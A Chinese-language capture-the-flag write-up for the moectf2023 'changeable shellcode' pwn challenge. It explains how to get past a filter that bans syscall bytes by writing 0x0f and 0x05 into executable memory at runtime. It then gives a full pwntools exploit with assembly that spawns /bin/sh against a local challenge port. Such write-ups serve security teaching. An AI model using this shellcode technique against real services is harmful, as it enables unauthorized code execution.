---
title: moectf2023 - changeable shellcode
date: 2023/9/24 12:00:00
updated: 2024/7/30 10:28:00
tags:
    - noob
excerpt: 通过分析64位程序的shellcode，利用特定内存区域绕过检测并成功打开shell。
---

## 文件分析

下载`shellcode`, 保护全开  
ghidra分析为64位程序

## 解题思路

有40个字节的空间，并且没有syscall，需要实现打开shell

而存放的地方，更是~~十分甚至是九分的~~奇怪，这个值在rax寄存器中有  
gdb `vmmap`查看发现该区域可读写执行

总体思路就是在这片区域分别连续写入0x5和0xf来绕开检测，
然后跳转到写了syscall`|05|0f|`的地址，
并且除了syscall以外的指令要写到最简以免长度超限

{% notel green fa-arrow-right tips %}
1. 32位的int 0x80好像不能用，就算设置rax=0xb，也无法正常打开shell
2. 不要用ascii转换器，22字节的shellcode可以转出76字节来
{% endnotel %}

## EXPLOIT

```python
from pwn import *
sh = remote("localhost", 43877)

code = '''
mov rbx, 0x68732f6e69622f   ; '/bin/sh'
push rbx
mov rdi, rsp                ; rsp现在指向栈上sh字符串位置
xor esi, esi                ; 如果push rsp再用ni会直接运行到底，建议使用si
xor edx, edx
mov qword ptr[rax], 0xf     ; rax -> 0x114514000
nop                         ; preventing optimization
mov qword ptr[rax + 1], 0x5
push 0x3b
pop rax
jmp $ - 0x25                ; 64位的跳转偏移地址是这样的！跳转回0x114514000
'''
# 汇编后39字节，还可以压得更小的也可以开一个discussion

shc = asm(code, arch='amd64')
sh.sendline(shc)
sh.interactive()
```

Done.
